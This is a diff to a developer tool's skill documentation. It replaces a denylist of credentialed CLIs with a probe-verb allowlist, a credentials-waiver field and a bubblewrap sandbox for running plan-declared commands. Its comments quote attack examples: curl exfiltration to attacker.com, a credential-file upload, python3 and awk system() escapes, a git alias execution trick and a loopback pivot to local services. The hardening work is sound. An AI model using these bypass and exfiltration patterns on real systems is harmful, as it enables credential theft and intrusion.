@@ -16,7 +16,7 @@ If `$ARGUMENTS` contains `--headless`, set `HEADLESS_MODE=true`. Strip `--headle
 When `HEADLESS_MODE=true`:
 
 - On any FAIL: abort with error details, no prompt
-- On all PASS/SKIP: continue silently
+- On all PASS/SKIP: continue silently. **Two exceptions, both Check 10 only, both always emitted:** **SKIP-DECLARED** — continue, but emit one line naming the declared credential scope (a verification waiver exists to be reviewable, so silencing it defeats it); and **SKIP-NOSANDBOX** — continue, but emit one line stating that Check 10 did not run at all on this host. The second is the more important of the two: it means a security-relevant gate is dark, and folded into the silent set it is indistinguishable from the gate having nothing to do.
 
 ## Phase 0: Context Detection
 
@@ -653,7 +653,7 @@ The current ban-list (extend as new classes are discovered):
 
 Invariant gate per `knowledge-base/project/learnings/2026-04-27-preflight-security-gates-skip-vs-fail-defaults.md`: SKIP only when truly indeterminate; FAIL when the invariant ("the documented command actually works against the live world") is contradicted.
 
-**Reference implementation.** `plugins/soleur/test/lib/discoverability-test-parser.ts` mirrors the parser + classifier in TypeScript so the 8 decision states can be unit-tested without subshells. The bash below IS the production runtime — the TS file is for tests. If they drift, the bash wins.
+**Reference implementation.** `plugins/soleur/test/lib/discoverability-test-parser.ts` mirrors the parser + classifier in TypeScript so the decision states can be unit-tested without subshells. The bash below IS the production runtime — the TS file is for tests. If they drift, the bash wins.
 
 **Step 10.1: Sensitive-path gate (re-use Check 6 SSOT).**
 
@@ -709,12 +709,16 @@ If the block is missing, return **FAIL** with: "Sensitive-path diff but plan fil
 
 **Step 10.4: Extract `discoverability_test.command` and `expected_output`.**
 
-The plan-template schema (`plan-issue-templates.md:60-62`) defines:
+The plan-template schema (`plan-issue-templates.md` §Observability →
+`discoverability_test`) defines:
 
 ```yaml
 discoverability_test:
-  command:         # one command an operator can run LOCALLY (no ssh)
-  expected_output: # canonical "everything OK" output
+  command:              # one command an operator can run LOCALLY (no ssh)
+  expected_output:      # canonical "everything OK" output
+  credentials_required: # OPTIONAL — see Step 10.4; declares a probe with no
+                        # unauthenticated substitute, which Check 10 then SKIPs
+                        # without executing
 ```
 
 Plans use TWO shapes — strict YAML (**Form A**, canonical) AND looser prose with a fenced code block followed by `Expected output: …` (**Form B**, PR #4148 shape). The parser MUST accept both forms.
@@ -802,6 +806,26 @@ if [[ -z "$EXPECTED" ]]; then
 fi
 ```
 
+**Normalize `$CMD` ONCE, here, before anything else reads it.**
+
+Every downstream consumer — the probe-verb gate, the shell-active reject, and the sandboxed
+exec — must see the SAME string. Gating one form while executing another is a laundering
+gap, and normalizing inside the gate alone produced exactly that: the gate judged the
+normalized command while Step 10.5 rejected the raw one on its embedded newline, so a Form A
+block scalar carrying a leading `#` comment failed the runtime even though the gate (and the
+TypeScript mirror) accepted it. The mirror's `normalizeCommand()` is this, and the parity
+harness only compares the GATE, so this divergence was invisible to it.
+
+```bash
+# Drop full-line `#` comments and blank lines, then trim. A `#` inside a quoted
+# argument is untouched — only whole comment LINES match. Verified across the
+# 642-command corpus: 6 commands change (all block scalars with leading comment
+# lines, the shape this fixes) and no quoted `#` is altered.
+CMD="$(printf '%s' "$CMD" | sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d')"
+CMD="${CMD#"${CMD%%[![:space:]]*}"}"
+CMD="${CMD%"${CMD##*[![:space:]]}"}"
+```
+
 If `$CMD` is empty after both attempts, return **FAIL** with: "Plan `<PLAN_PATH>` declares an Observability block but no `discoverability_test.command` could be parsed. See `plugins/soleur/skills/plan/references/plan-issue-templates.md` §Observability."
 
 **Reject SSH commands** (defense-in-depth):
@@ -813,65 +837,234 @@ if [[ "$CMD" =~ (^|[[:space:]]|/)ssh([[:space:]]|$) ]]; then
 fi
 ```
 
-**Reject credentialed CLIs** (the load-bearing control for the folded-scalar fix):
+**Read `credentials_required` and honour a declared-credentialed probe** (ADR-175 Layer 3):
 
-Check 10 executes `$CMD` with the operator's ambient **file-backed** CLI auth reachable.
-`env -i` in Step 10.5 scrubs environment variables but **not** credentials on disk,
-because `HOME` is deliberately preserved — the Doppler CLI reads a live `dp.ct.*` token
-from its on-disk config in the home Doppler directory (`~/.doppler/`). Do not cite `env -i` as a mitigation for a
-credential-bearing command.
+Some probes verify a property that has **no unauthenticated substitute** — a warehouse
+query API with no anonymous form, for instance. Before #7393 those had only two outcomes:
+FAIL (verify nothing) or rewrite to a weaker property (verify the wrong thing). The
+optional `discoverability_test.credentials_required` sub-field is the sanctioned third:
+declare the scope and the justification, and Check 10 **skips without executing**.
 
-This reject is required because fixing the folded-scalar parser (#6772) is a **fail-open
-transition**: commands that previously parsed to the literal `>` and self-rejected at
-Step 10.5 now parse correctly and reach execution. A folded scalar joins with a *space*
-and therefore carries no shell-active token by construction, so Step 10.5's reject set
-cannot constrain what a folded command *is* — only the verb rejects here can.
+Read it with a flat sub-field `awk`, exactly as `expected_output` already is — do **not**
+extend [`./scripts/parse-form-a.awk`](./scripts/parse-form-a.awk), which is pinned
+byte-exactly against its TypeScript mirror by the P1/P2/P3 parity harness. The flat read
+inherits `expected_output`'s pre-existing limitation (two `discoverability_test`
+sub-blocks could confuse it); that is unchanged here.
+
+The read is SCOPED TO THE `discoverability_test:` SUB-BLOCK, and that scoping is
+load-bearing rather than tidiness. It NARROWS the bypass class without closing
+it — a `credentials_required:` line inside the command's own block scalar is
+still honoured, so a multi-line command can waive itself. Closing that needs a
+YAML-aware parse this flat `awk` deliberately avoids. `expected_output` is read with a flat
+whole-block scan and survives it, because a stray `expected_output:` only changes
+what a probe is compared against. This field **skips execution entirely**, so the
+same flat read is a bypass: measured, one `credentials_required:` line under
+`liveness_signal:` — or in prose anywhere in the section — waived a perfectly
+runnable unauthenticated `curl` probe. Three further shapes declare nothing and
+are rejected rather than honoured: a `#`-comment-only value (the documented
+template ships one, so an agent copying the canonical schema produced a
+valid-looking declaration whose "scope" was the template's own comment), a bare
+`>`/`|` block indicator, and an empty value.
 
 ```bash
-# Match against a QUOTE-STRIPPED copy: bash resolves `"doppler"`, `\doppler` and
-# `dopp""ler` to the same binary, but the word-boundary anchors below do not see
-# through the quote characters. Strip them from a COPY only — never from the string
-# that would be executed.
-CMD_DEQ="${CMD//[\"\'\\]/}"
-if [[ "$CMD_DEQ" =~ (^|[[:space:]]|/)(doppler|gh|aws|supabase|stripe|hcloud|wrangler|terraform|flyctl|vercel)([[:space:]]|$) ]]; then
-  echo "FAIL: discoverability_test.command invokes a credentialed CLI; refusing to run. Check 10 executes with the operator's ambient file-backed CLI auth reachable (env -i does NOT scrub it — \$HOME is preserved, so the Doppler CLI token, SSH private keys, netrc, git credentials, AWS credentials, the gcloud credentials database, and the Docker config are all readable). Use an unauthenticated probe, or see the Check-10 credentialed-probe design issue if this probe genuinely needs credentials."
+# Log-injection guard, defined HERE rather than in Step 10.5. Every value echoed
+# below ($CREDS_REQ, $PROBE_VERB) is derived from PR-authored plan
+# text, which this check's own design treats as adversarial — and Step 10.5's
+# copy is ~250 lines further down, so these paths could not call it even in
+# principle. U+2028/U+2029 are NOT in [[:space:]] under LC_ALL=C, so they survive
+# tokenization into $PROBE_VERB and reach the operator's terminal; ESC bytes do
+# too. Same helper and same reasoning as Check 5 (which cites the precedent).
+# Step 10.5 redefines it identically; the redefinition is harmless.
+sanitize() { printf '%s' "$1" | LC_ALL=C tr -d '\000-\037\177' | LC_ALL=C sed $'s/\xe2\x80\xa8//g; s/\xe2\x80\xa9//g'; }
+
+# awk walks only the indented children of `discoverability_test:` — never the
+# whole Observability block. `tolower()` rather than bash's ${var,,} because the
+# latter is bash 4.0+ and this block runs ~200 lines BEFORE the bwrap probe, so
+# on a bash 3.2 host (stock macOS) ${var,,} is a parse error long before Check 10
+# could reach its graceful SKIP.
+CREDS_REQ=$(awk '
+  /^[[:space:]]*discoverability_test:/ { in_dt=1; parent=match($0, /[^ \t]/); next }
+  in_dt && /^[[:space:]]*$/ { next }
+  in_dt {
+    ind = match($0, /[^ \t]/)
+    if (ind <= parent) { exit }
+    if ($0 ~ /^[[:space:]]*credentials_required:/) {
+      sub(/^[[:space:]]*credentials_required:[[:space:]]*/, ""); print; exit
+    }
+  }
+' "$PREFLIGHT_TMP/preflight-observability.txt")
+# Trim, THEN strip a symmetric quote pair. Order and completeness both matter:
+# stripping only `"` and never trimming meant `credentials_required: 'placeholder'`
+# and `credentials_required: TODO␠␠` both reached the SKIP-DECLARED branch while
+# the TypeScript mirror correctly FAILed them — so the placeholder superset fix
+# was undone in the runtime of record by one apostrophe, invisibly to the suite.
+CREDS_REQ="${CREDS_REQ#"${CREDS_REQ%%[![:space:]]*}"}"
+CREDS_REQ="${CREDS_REQ%"${CREDS_REQ##*[![:space:]]}"}"
+case "$CREDS_REQ" in
+  \"*\") CREDS_REQ="${CREDS_REQ#\"}"; CREDS_REQ="${CREDS_REQ%\"}" ;;
+  \'*\') CREDS_REQ="${CREDS_REQ#\'}"; CREDS_REQ="${CREDS_REQ%\'}" ;;
+esac
+# A comment-only value, a bare block/fold indicator, or an empty value declares
+# nothing. Treat all as absent so the normal path runs. The CHOMPED indicators
+# (`>-` `>+` `|-` `|+`) are included because #6772 — the change cited as the
+# reason authors reach for indicators at all — is exactly what made those forms
+# first-class for `command:`, so they are the likelier typo, not the rarer one.
+case "$CREDS_REQ" in
+  "#"*|">"|">-"|">+"|"|"|"|-"|"|+") CREDS_REQ="" ;;
+esac
+
+if [[ -n "$CREDS_REQ" ]]; then
+  # Placeholder text is a FAIL. This set is a SUPERSET of deepen-plan §4.7's —
+  # they were disjoint on exactly the wrong members, so `placeholder` and
+  # `manual operator check` (the repo's canonical "says nothing" markers) were
+  # GRANTING the waiver.
+  CREDS_REQ_LC=$(printf '%s' "$CREDS_REQ" | tr '[:upper:]' '[:lower:]')
+  if [[ "$CREDS_REQ_LC" =~ ^(todo|tbd|n/a|na|none|tktk|placeholder|manual\ operator\ check|\.\.\.|\<.*\>)$ ]]; then
+    echo "FAIL: discoverability_test.credentials_required is a placeholder (\"$(sanitize "$CREDS_REQ")\"). State the credential scope and why no unauthenticated probe verifies the same property, or remove the field."
+    exit 1
+  fi
+  echo "SKIP-DECLARED: discoverability_test declares credentials_required — $(sanitize "$CREDS_REQ"). Check 10 did NOT execute the command: running it inside the Step 10.5 sandbox would fail for lack of credentials and prove nothing about the property under test."
+  exit 0
+fi
+```
+
+`SKIP-DECLARED` is its **own** terminal, never folded into ordinary `SKIP`, and it carries
+the declared scope verbatim into the Phase 2 aggregate row. That is deliberate: this is the
+cheapest path to a non-FAIL for any probe whose verb Check 10 cannot run — though
+not the cheapest overall: a tautological probe (`printf 200` against
+`expected_output: "200"`) reaches PASS and is counted by none of the three
+counterweights below. That gap is pre-existing, not introduced here, but the
+superlative was wrong as written. For the declared path specifically, this is and in `/soleur:one-shot` the
+same agent authors the declaration and runs the gate. Left invisible it would convert
+Check 10 from a verification gate into self-certification. The three mechanical
+counterweights are the distinct terminal, the committed corpus baseline count in
+`plugins/soleur/test/preflight-discoverability-test.test.ts` (so each new adoption is a
+reviewable diff line rather than silent drift), and the checklist entry in
+`observability-coverage-reviewer` §Step 6.
+
+Note what the waiver is and is not: it is a **verification waiver**, not an execution
+bypass. The declared path never executes, so no verb reaches the sandbox. The waiver does
+genuinely span *any* verb — that is why it is counted rather than reordered.
+
+**Probe-verb gate** (ADR-175 Layer 2, revised — schema validation, not a security control):
+
+The gate lives in [`./scripts/probe-verb-gate.sh`](./scripts/probe-verb-gate.sh) rather than
+inline here, for the same reason [`./scripts/parse-form-a.awk`](./scripts/parse-form-a.awk)
+is a real file: a parity harness must be able to **execute the production runtime** instead
+of regex-scraping this prose. That is not hypothetical — while this gate was inlined with a
+hand-maintained TypeScript mirror, two parser asymmetries shipped green inside the very PR
+that created the mirror (a Form B command kept its markdown indentation, so the effective
+verb was `""`; a Form A block scalar kept a leading `#`, so it was `"#"`). Content pins on
+the allowlist literal cannot detect behavioural drift.
+
+```bash
+PROBE_GATE="$(git rev-parse --show-toplevel)/plugins/soleur/skills/preflight/scripts/probe-verb-gate.sh"
+test -r "$PROBE_GATE" || { echo "FAIL: Check 10 probe-verb gate missing at $PROBE_GATE"; exit 1; }
+if ! PROBE_REJECT="$(bash "$PROBE_GATE" "$CMD")"; then
+  echo "FAIL: $(sanitize "$PROBE_REJECT")"
   exit 1
 fi
 ```
 
-**This is a DENYLIST, and a denylist cannot be complete against a preserved `$HOME`.**
-It does NOT catch indirect invocation — `bash scripts/foo.sh` whose body self-wraps
-`doppler run -c prd`, a `curl --data-binary @<doppler-config>` exfiltration, or any
-credentialed verb not listed. Those remain reachable and are accepted for now; the durable
-fix is an ALLOWLIST of probe verbs (curl/dig/getent/bun/bash), tracked separately. Do not
-describe this reject as though it closed the class.
-<!-- SECURITY (at-mention auto-attach footgun): the exfil example above uses the
-     PLACEHOLDER `<doppler-config-file>`, NOT a real resolvable path. Never write an
-     at-sign immediately followed by a real home/absolute path (tilde-slash,
-     dollar-HOME-slash, or a `/home` `/Users` `/root` `/etc` absolute) in ANY
-     skill/agent/doc that loads into agent context: Claude Code's @-mention auto-attach
-     resolves such a token to the real on-disk file and attaches its CONTENTS to the
-     transcript. Observed 2026-07-22 during PR #6830's ship — the prior literal here
-     resolved to the operator's live Doppler root token and auto-attached it. The guard
+**What this gate is, stated honestly.** It answers *"is this an executable command, and one
+Check 10's PATH can run?"* — schema validation on the `command:` field. It is **not** a
+security control and **not** a legibility control, and the earlier revision of this section
+claimed both.
+
+It cannot be a security control, and the reason is structural rather than incidental: the
+gate's own sanctioned remedy is *"wrap it in a repo-relative script"* — i.e. `bash
+scripts/x.sh`, which is arbitrary in-sandbox code execution. Every shape it could reject is
+strictly **weaker** than the remedy it prescribes. Step 10.5 additionally runs
+`bash -c "$CMD"`, so every probe already *is* an inline program; a rule rejecting
+`python3 -c` while printing instructions to use `bash scripts/x.sh` rejects a spelling, not
+a capability. Measured on the plan corpus, the deleted arg rules were 50% false-positive
+and the deleted path rule fired once across the corpus, while false-rejecting
+`bun test … -p`, `python3 … --print json` and `node … -e prod`.
+
+It is not a legibility control either: the full command sits in the PR diff regardless, and
+`git -c alias.…`, `bash scripts/x.sh` and `./anything` all read as innocuous while doing
+arbitrary things.
+
+**What it measurably buys**: 34 entries in the plan corpus are prose in a `command:` field
+(*"Sentry issue search feature:…"*, *"Open Sentry → Issues → …"*). Those become a named FAIL
+at authoring time instead of an opaque `rc=127` at ship time. That value comes entirely
+from the bare verb list, which is why the arg and path rules were deleted rather than
+repaired.
+
+**The allowlist is a corpus-frequency list, not a capability list.** `sh`, `dig` and
+`getent` are absent because they have **zero** corpus uses; `awk`, `sed` and `find` are
+absent for the same reason, **not** because they are uniquely dangerous. `git` is on the
+list and is a full execution vector — `git -c alias.x='!cmd' x` runs arbitrary commands —
+and so is `bash <script>`. Both are recorded in ADR-175 as worked examples that an
+allowlist entry is an authority grant which this gate does not bound.
+
+**Every allowlist entry is an authority grant — do not describe either layer as though it
+closed the class.** Layer 1 (the Step 10.5 sandbox) bounds what a verb can *reach*, but
+`curl` retains network egress and `bash <script>` retains arbitrary in-sandbox code
+execution. Adding a verb therefore warrants the same scrutiny as an infra change, not a
+"legibility decision". Conversely the allowlist bounds *legibility*, not authority: it is
+the sandbox, not the verb list, that makes a script which self-wraps `doppler run -c prd`
+fail loudly instead of succeeding silently.
+<!-- SECURITY (at-mention auto-attach footgun): never write an at-sign immediately
+     followed by a real home/absolute path (tilde-slash, dollar-HOME-slash, or a
+     `/home` `/Users` `/root` `/etc` absolute) in ANY skill/agent/doc that loads into
+     agent context: Claude Code's @-mention auto-attach resolves such a token to the
+     real on-disk file and attaches its CONTENTS to the transcript. Observed
+     2026-07-22 during PR #6830's ship — a literal here resolved to the operator's
+     live Doppler root token and auto-attached it. The guard
      .github/scripts/test/test-no-at-mention-credfile-footgun.sh enforces this repo-wide. -->
 
-The `(^|[[:space:]]|/)` … `([[:space:]]|$)` boundaries are load-bearing: the `/`
-alternative catches `/usr/local/bin/gh`, and the trailing boundary keeps legitimate
-probes runnable (a bare substring match would false-reject
-`curl https://app.soleur.ai/highlights` for containing `gh`).
+**What the retired denylist was, and why counting verbs was never enough.** Until #7393
+this gate was a denylist of ten credentialed CLIs (`doppler`, `gh`, `aws`, `supabase`,
+`stripe`, `hcloud`, `wrangler`, `terraform`, `flyctl`, `vercel`). It could not be complete:
+it never caught indirect invocation (`bash scripts/foo.sh` whose body self-wraps
+`doppler run -c prd`), nor any future vendor CLI, nor an absolute-path read of a credential
+file by a permitted verb. Measured during #7393's planning: with the whole filesystem
+readable, `awk 'BEGIN{system("…")}'` executed arbitrary commands past the shell-active
+reject, and a `curl --data-binary` against a home-rooted credential path carried no
+shell-active token at all. **The durable fix was never a longer list — it was moving the
+control into the filesystem layer (Step 10.5).**
 
-**Step 10.5: Sanitize and run with a tight timeout.**
+**Step 10.5: Sanitize and run inside a filesystem-isolated sandbox, with a tight timeout.**
 
 The block below uses a `text` fence (not `bash`) so the skill-security-scan
 calibration suite does not flag it as `shell-spawn-c-flag`. The runtime IS a
-shell-spawn — defense-in-depth `ssh`/`$()`/backtick rejects in Step 10.4 +
-the 15s outer timeout are the load-bearing mitigations; the plan-file source
+shell-spawn — the **load-bearing** mitigation is the bubblewrap sandbox below
+(ADR-175 Layer 1); the Step 10.4 verb allowlist, the `ssh`/`$()`/backtick
+rejects and the 15s outer timeout are defense-in-depth. The plan-file source
 is trust-on-PR-review. See [`2026-05-20-preflight-check-10-discoverability-test-execution.md`](../../../../knowledge-base/project/learnings/best-practices/2026-05-20-preflight-check-10-discoverability-test-execution.md).
+
+**Why a filesystem boundary and not an environment tweak.** `env -i` scrubs environment
+*variables*; it does not remove *files or sockets*. An ephemeral `$HOME` changes where a
+CLI **looks**, not what is **readable** — measured during #7393's planning,
+`wc -c < <the operator's home Doppler config>` returned a live 294-byte service token
+under `HOME=$(mktemp -d)`. The sandbox removes the credential stores as files:
+
+| Probe, run inside the sandbox | Result |
+| --- | --- |
+| absolute-path read of the home Doppler config | `No such file or directory` |
+| glob read across `/home/*/…` | `No such file or directory` |
+| home SSH private key | `No such file or directory` |
+| `ls /run/user/<uid>/bus` (D-Bus → Secret Service keyring) | `No such file or directory` |
+| `awk 'BEGIN{system("<absolute-path read>")}'` | `cannot open` |
+| append to a tracked repo file | `Read-only file system` |
+| `curl https://soleur.ai/` | `200` |
+| `dig +short soleur.ai` | resolves |
+| `grep -c . AGENTS.md` | matches the host value |
+
+The read-only repo bind is what closes the **write-back escalation**: without it a probe
+can install `.git/hooks/pre-commit`, which `/soleur:ship` then executes seconds later with
+the operator's real `$HOME` — turning a few-second credential window into a full
+compromise.
 
 ```text
 # Defense-in-depth: reject every shell-active token before run. The plan file
-# is trust-on-PR-review but this regex is what blocks a malicious plan author
-# from chaining `; curl attacker.com?leak=$TOKEN` after a benign curl probe.
+# is trust-on-PR-review. NOTE: this regex blocks ONE SPELLING of chaining. Its
+# complement — the inline-program arg rules — was deleted in #7393, so
+# `python3 -c "__import__('os').system('curl …')"` now passes both this reject
+# and the verb gate with no rejected token present. Do NOT cite it as the control
+# against a malicious plan author; it is a typo-catcher. The Step 10.5 sandbox is
+# the control.
 # Rejects: ;, &&, ||, |, >, <, &, NEWLINE, parameter expansion ($VAR or ${VAR}),
 # command substitution $(), backticks, process substitution <(/>().
 #
@@ -879,19 +1072,121 @@ is trust-on-PR-review. See [`2026-05-20-preflight-check-10-discoverability-test-
 # scalar joins continuations with \n, which `bash -c` runs as separate statements —
 # verified before this was added: a second `touch` line in a block scalar executed.
 # It contributes ZERO coverage to folded scalars, which join with a SPACE and carry no
-# shell-active token; those are covered by Step 10.4's credentialed-CLI reject. Do not
+# shell-active token; those are covered by Step 10.4's probe-verb gate. Do not
 # cite this reject as a mitigation for the folded-command class.
 if [[ "$CMD" =~ (\$\(|\`|\<\(|\>\(|\;|\&\&|\|\||\||\>|\<|\&|$'\n'|\$\{?[A-Za-z_]) ]]; then
   echo "FAIL: discoverability_test.command contains shell-active token; refusing to run."
   exit 1
 fi
 
+# --- Sandbox construction (ADR-175 Layer 1) -------------------------------
+# The flags live in ONE array so the establishment probe below and the real run
+# cannot drift apart. MOUNT ORDER IS LOAD-BEARING: bwrap applies mounts in the
+# order given and this repo lives under /home, so `--tmpfs /home` MUST precede
+# `--ro-bind "$REPO_ROOT"`. Reversed, the tmpfs silently clobbers the repo bind
+# and every probe dies with `Can't chdir` — a failure that reads as a bwrap
+# incompatibility rather than an ordering bug. The repo's own agent sandbox
+# documents the same semantics (apps/web-platform/server/agent-runner-sandbox-config.ts,
+# #5733 / PR #5848): broad `--tmpfs` shadows an earlier bind.
+REPO_ROOT="$(git rev-parse --show-toplevel)"
+# `--tmpfs /run` removes /run/systemd/resolve/stub-resolv.conf, which
+# /etc/resolv.conf symlinks to on systemd-resolved hosts. Without rebinding the
+# resolved target, EVERY curl probe returns rc=6 — indistinguishable from the
+# #4148 DNS-typo regression this check exists to catch.
+RESOLV="$(readlink -f /etc/resolv.conf)"
+# IN A WORKTREE, `.git` IS A FILE, NOT A DIRECTORY — it points at the git common
+# dir under the bare repo root, which is OUTSIDE $REPO_ROOT. Binding only
+# $REPO_ROOT therefore breaks every `git` probe with
+# `fatal: not a git repository`, and `git` is an allowlisted verb. Soleur's whole
+# workflow runs in worktrees, so this is the common case, not the edge case. The
+# bind stays READ-ONLY, so the `.git/hooks/pre-commit` write-back escalation is
+# still closed. Found by the #7393 execution replay — a static verb tally
+# structurally could not have detected it.
+# `--tmpfs /var/tmp` is a scratch dir, not a convenience: `/var` is not bound, so
+# without it `/var/tmp` does not exist inside the sandbox and every probe using
+# this repo's own documented scratch convention (`TMPDIR=/var/tmp`, per
+# scripts/test-all.sh) dies on `mktemp: No such file or directory`. bwrap creates
+# the `/var` parent implicitly, so nothing else from the host `/var` is exposed.
+GIT_COMMON_DIR="$(git rev-parse --path-format=absolute --git-common-dir)"
+GIT_BIND=()
+if [[ "$GIT_COMMON_DIR" != "$REPO_ROOT"/* ]]; then
+  GIT_BIND=(--ro-bind "$GIT_COMMON_DIR" "$GIT_COMMON_DIR")
+fi
+BWRAP_ARGS=(
+  --ro-bind /usr /usr --ro-bind /etc /etc
+  --symlink usr/bin /bin --symlink usr/lib /lib
+  --symlink usr/lib64 /lib64 --symlink usr/sbin /sbin
+  --tmpfs /home --tmpfs /root --tmpfs /run --tmpfs /tmp --tmpfs /var/tmp
+  --ro-bind "$RESOLV" "$RESOLV"
+  "${GIT_BIND[@]}"
+  --ro-bind "$REPO_ROOT" "$REPO_ROOT" --chdir "$REPO_ROOT"
+  --dev /dev
+  --unshare-all --share-net --die-with-parent --new-session
+)
+
+# FAIL-CLOSED, with no unsandboxed fallback. A degraded sandbox that silently
+# reverted to the status quo would be worse than no sandbox at all, because this
+# skill would then claim a boundary that is not there.
+if ! command -v bwrap >/dev/null 2>&1; then
+  # SOLEUR_* sentinel so this is COUNTABLE across the fleet, not one line of
+  # local stdout. The PostToolUse Bash marker extractor
+  # (apps/web-platform/server/git-lock-marker-telemetry.ts) re-emits SOLEUR_*
+  # markers as structured pino -> journald -> Vector -> Better Stack, so a
+  # silently-disabled Check 10 becomes queryable instead of invisible.
+  # Deliberately NOT in WEDGE_RE: queryable, not paged.
+  echo "SOLEUR_PREFLIGHT_CHECK10_NOSANDBOX reason=bwrap-absent uname=$(uname -s)"
+  case "$(uname -s)" in
+    Darwin) echo "SKIP-NOSANDBOX: Check 10 executes plan-declared commands only inside a bubblewrap (bwrap) sandbox. bubblewrap is Linux-only and has no macOS port, so Check 10 is PERMANENTLY disabled on this host — this is the steady state, not a transient condition. Refusing to run the probe unsandboxed. Tracked for a Darwin sandbox implementation; see ADR-175 Consequences." ;;
+    *)      echo "SKIP-NOSANDBOX: Check 10 executes plan-declared commands only inside a bubblewrap (bwrap) sandbox, and bwrap is not installed on this host. Refusing to run the probe unsandboxed. Install it with: sudo apt-get install -y bubblewrap   (Debian/Ubuntu) or sudo dnf install -y bubblewrap   (Fedora/RHEL)." ;;
+  esac
+  exit 0
+fi
+
+# `--proc /proc` must DEGRADE, not fail. /proc cannot be mounted inside a nested
+# user namespace (a kernel restriction), and preflight runs inside exactly such a
+# context on the containerized one-shot pipeline path. The repo already pays for
+# this lesson: `enableWeakerNestedSandbox` in agent-runner-sandbox-config.ts
+# (#1557) skips `--proc /proc` for the same reason. A hard `--proc` here would
+# fail establishment in every containerized run and — because the design is
+# fail-closed — SKIP Check 10 for all of them, which reads exactly like the
+# fail-closed design working correctly. /proc is not part of what the boundary
+# protects, so dropping it does not weaken the control: measured, both forms keep
+# every credential store unreachable and both run curl/node/python3/grep.
+BWRAP_PROC=(--proc /proc)
+if ! bwrap "${BWRAP_PROC[@]}" "${BWRAP_ARGS[@]}" true 2>/dev/null; then
+  BWRAP_PROC=()
+  if ! bwrap "${BWRAP_ARGS[@]}" true 2>/dev/null; then
+    # Report what was MEASURED, not a hypothesis (AP-021). The earlier message
+    # named kernel.apparmor_restrict_unprivileged_userns without ever reading it,
+    # while `2>/dev/null` discarded bwrap's own stderr — the only real evidence,
+    # on a surface where nobody can re-run it by hand.
+    BWRAP_ERR="$(bwrap "${BWRAP_ARGS[@]}" true 2>&1 >/dev/null | tail -c 200)"
+    USERNS_MAX="$(cat /proc/sys/user/max_user_namespaces 2>/dev/null || echo unknown)"
+    APPARMOR_RESTRICT="$(cat /proc/sys/kernel/apparmor_restrict_unprivileged_userns 2>/dev/null || echo unset)"
+    echo "SOLEUR_PREFLIGHT_CHECK10_NOSANDBOX reason=establish-failed userns_max=${USERNS_MAX} apparmor_restrict=${APPARMOR_RESTRICT}"
+    echo "SKIP-NOSANDBOX: Check 10 could not establish the bwrap sandbox on this host. Measured: max_user_namespaces=${USERNS_MAX}, apparmor_restrict_unprivileged_userns=${APPARMOR_RESTRICT}. bwrap said: $(sanitize "$BWRAP_ERR"). Refusing to run the probe unsandboxed."
+    exit 0
+  fi
+fi
+
 # Run with 15s wall-clock cap, capture stdout + exit code separately.
-# `env -i` SCRUBS Doppler/Supabase secrets from the child env so even an
-# attacker-crafted command that bypasses the reject (e.g., via a future regex
-# gap) cannot exfil `$SUPABASE_SERVICE_ROLE_KEY` via parameter expansion.
-# PATH is restored explicitly so `curl`/`dig`/`timeout` are still resolvable.
-DT_OUT=$(env -i PATH=/usr/local/bin:/usr/bin:/bin HOME="$HOME" timeout 15s bash -c "$CMD" 2>/dev/null; printf 'RC:%d' "$?")
+# `env -i` SCRUBS Doppler/Supabase secrets from the child env. It is LOAD-BEARING,
+# not redundant — an earlier revision of this comment called it
+# "redundant-but-harmless" on the grounds that the on-disk stores are unmounted
+# anyway, and that reasoning is WRONG: bwrap does not scrub the environment
+# (measured — a variable set here survives into the sandbox verbatim), and
+# DOPPLER_TOKEN / GH_TOKEN / ANTHROPIC_API_KEY live in the environment ONLY, with
+# no on-disk store to unmount. With `curl` allowlisted and --share-net retaining
+# egress, dropping `-i` exfiltrates every credential in preflight's environment.
+# Pinned by an anchored assertion in the F2 test; do not weaken either.
+# PATH is restored explicitly so `curl`/`timeout` are still resolvable; HOME
+# points at the sandbox tmpfs.
+#
+# `</dev/null` is load-bearing: without it the probe inherits preflight's stdin,
+# so a command that reads stdin either consumes input the caller was still using
+# or blocks for the full 15s and reports as a timeout. Measured while building
+# #7393's execution replay, whose own read-loop the probes silently ate.
+DT_OUT=$(bwrap "${BWRAP_PROC[@]}" "${BWRAP_ARGS[@]}" /usr/bin/env -i PATH=/usr/local/bin:/usr/bin:/bin HOME=/tmp timeout 15s bash -c "$CMD" </dev/null 2>/dev/null; printf 'RC:%d' "$?")
 DT_RC="${DT_OUT##*RC:}"
 DT_STDOUT="${DT_OUT%RC:*}"
 
@@ -908,24 +1203,57 @@ DT_STDOUT_SAFE=$(sanitize "$DT_STDOUT")
 
 The 15-second cap is a hard ceiling. Plans typically prescribe `curl --max-time 10`; the 15s outer cap accommodates 10s curl + 5s DNS + handshake without giving the curl invocation infinite headroom if it lacks `--max-time`.
 
-**Step 10.6: Decision matrix (8 states, 1 PASS terminal).**
+**What the sandbox does NOT close, named so no one cites it as closure.**
+
+`--share-net` **retains the host network namespace** — it does not create a fresh one. So
+`127.0.0.1` inside the sandbox is the operator's real loopback. Measured on a development
+workstation from inside the shipped `BWRAP_ARGS`: the sandbox's netns inode is identical to
+PID 1's, and local Supabase Kong/PostgREST (54321), Postgres (54322) and Studio (54323) are
+all reachable. A plain `curl http://127.0.0.1:54321/…` passes all three layers.
+
+The class is **host-loopback pivot**, and it is materially worse than the egress case the
+earlier revision of this paragraph named: it reaches services that are unauthenticated
+*precisely because* they are loopback-bound, so the sandbox's "removes the credential
+stores as files" claim is true for files and false for anything reachable over loopback.
+
+Outbound egress remains too (`curl` is the dominant probe verb), so repo contents — and,
+via the read-only git common-dir bind, whole-history and local session state — can be sent
+to an arbitrary host. The repository is public, which bounds that half; it does not bound
+the loopback half.
+
+Closing it needs `--unshare-net` plus a userspace network stack
+(`slirp4netns --disable-host-loopback` or `pasta`): `--unshare-net` alone kills all egress,
+which surfaces as `curl` rc=6 — **indistinguishable from the #4148 DNS-typo signal this
+check exists to catch**. Tracked as #7412, recorded as open in ADR-175 `## Consequences`.
+
+A `127.0.0.1|localhost|::1` string reject is deliberately NOT used: it is bypassable in one
+token (`127.1`, `2130706433`, `0x7f000001`, a DNS A-record pointing at loopback, or any
+wrapped script), and adding it would let this skill claim a boundary that is not there —
+the denylist mistake ADR-175 exists to retire.
+
+**Step 10.6: Decision matrix (14 post-parse rows, 1 PASS terminal).**
 
 | # | State | Detection | Result | Rationale |
 | --- | --- | --- | --- | --- |
